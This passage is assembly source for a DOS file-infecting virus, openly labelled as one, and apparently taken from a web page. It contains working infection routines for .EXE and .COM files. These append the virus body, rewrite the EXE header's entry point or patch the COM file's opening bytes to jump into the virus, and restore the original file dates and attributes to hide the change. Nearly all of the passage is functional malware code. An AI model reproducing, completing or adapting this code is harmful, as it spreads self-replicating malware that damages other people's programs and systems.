	call move_pointer_end          ;move file pointer to end of file

	mov cx,10h
	div cx                         ;convert to paragraphs

	push ax
	sub ax,headers                 ;subtract header size in paragraphs

	pop cx
	cmp ax,cx
	ja endinfection                ;If file too small, end infection

	mov initcs,ax
	mov initip,dx                  ;set initial CS:IP in exe header
	sub dx,100h
	mov delta,dx                   ;set delta offset in virus

	mov initss,ax
	mov idword,virusid             ;set initial SS:SP in exe header

	add minallc,vlres+1            ;add virus size to minimum memory

	mov comid,0FFh                 ;set COM-ID field to nonzero (not COM)

	mov cx,vlength                 ;number of bytes in virus
	mov dx,100h

	mov ah,40h                     ;write file or device
	int 21h

	call move_pointer_end          ;move file pointer to end of file
	
	mov cx,512
	div cx                         ;change bytes in new file to pages
	cmp dx,0                       ;no remainder?
	je go_ahead_set
	
	inc ax                         ;if remainder, add another page

go_ahead_set:
	mov expages,ax
	mov exbytes,dx                 ;set EXE file size

	call move_pointer_beginning    ;move pointer to beginning of file

	mov cx,28                      ;header size in bytes
	mov dx,offset(exeheader)       ;write exe header back out to file

	mov ah,40h                     ;write file or device
	call function

endinfection:
	mov cx,oldtime
	mov dx,olddate

	mov ax,5701h                   ;set file date and time
	int 21h

	mov ah,3Eh                     ;close file with handle
	int 21h

	pop dx
	pop ds                         ;get old location of filename

	mov cx,oldattr
	mov ax,4301h                   ;set file attributes
	call function

	jmp exitvec                    ;return from interrupt

prepare_infect:
	push es
	pop ds

	mov ax,4300h                   ;get file attributes
	call function

	jnc file_ok                    ;no carry means filename exists

	jmp exitvec

file_ok:
	pop ax                         ;preserve return vector

	push ds
	push dx

	push ax                        ;put return vector on top of stack

	mov cs:oldattr,cx              ;save old file attributes

	xor cx,cx                      ;set to normal attributes

	mov ax,4301h                   ;set file attributes
	call function

	mov ax,3D02h                   ;open file for read/write access
	call function

	mov bx,ax                      ;file handle
	push cs
	pop ds
	
	mov ax,5700h                   ;get file date and time
	int 21h

	mov oldtime,cx
	mov olddate,dx                 ;save old time and date
	ret

infect_com:
	pop dx
	push dx                        ;get adress of filename off stack
	call prepare_infect            ;open and prepare to infect

	mov cx,compend-cptop           ;size of .COM file branch code
	mov dx,offset(saved)           ;saved bytes buffer

	mov ah,3Fh                     ;read file or device
	int 21h
			
	mov ax,word ptr comproc
	cmp word ptr saved,ax          ;is file already infected?
	je endinfection

	mov comid,0                    ;zero .COM id field
	call move_pointer_end          ;move file pointer to EOF

	mov delta,ax                   ;delta offset
	add ax,100h
	mov voffset,ax                 ;offset of virus code in .COM file

	mov cx,vlength                 ;length of virus to write
	mov dx,100h

	mov ah,40h                     ;write file or device
	int 21h

	call move_pointer_beginning    ;move file pointer to start of file

	mov cx,compend-cptop           ;size of .COM file branch code
	mov dx,offset(comproc)         ;.COM file branch code to write

	mov ah,40h                     ;write file or device
	int 21h

	jmp endinfection               ;we're done.

;----------------------------------------------------------------------------

vbot	equ	$                      ;bottom of virus code
heap	equ	$                      ;Beginning of heap

himem_o	dw	0
himem_s	dw	0                      ;himem.sys entry point adress

i21veco	dw	0
i21vecs	dw	0                      ;int 21h vector

exeheader:
exesign	dw	0                      ;EXE signature
exbytes	dw	0                      ;number of bytes in last page
expages	dw	0                      ;number of pages in file
reloci	dw	0                      ;number of items in relocation table
headers	dw	0                      ;size of header in paragraphs
minallc	dw	0                      ;minimum memory to be allocated
maxallc	dw	0                      ;maximum memory to be allocated
initss	dw	0                      ;initial SS value
idword	dw	0                      ;initial SP value (used as ID word)
chksum	dw	0                      ;complimented checksum
initip	dw	0                      ;initial IP value
initcs	dw	0                      ;initial CS value
reltabl	dw	0                      ;byte offset to relocation table
ovnum	dw	0                      ;overlay number

oldattr	dw	0                      ;old file attributes

oldtime	dw	0
olddate	dw	0                      ;old saved time and date

i2Fveco	dw	0
i2Fvecs	dw	0                      ;old INT 2Fh vectors

hbot	equ	$                      ;bottom of heap

sspace	db	64 dup ('+')           ;virus stack

end	massacre

</textarea></td></tr></table></body></html>
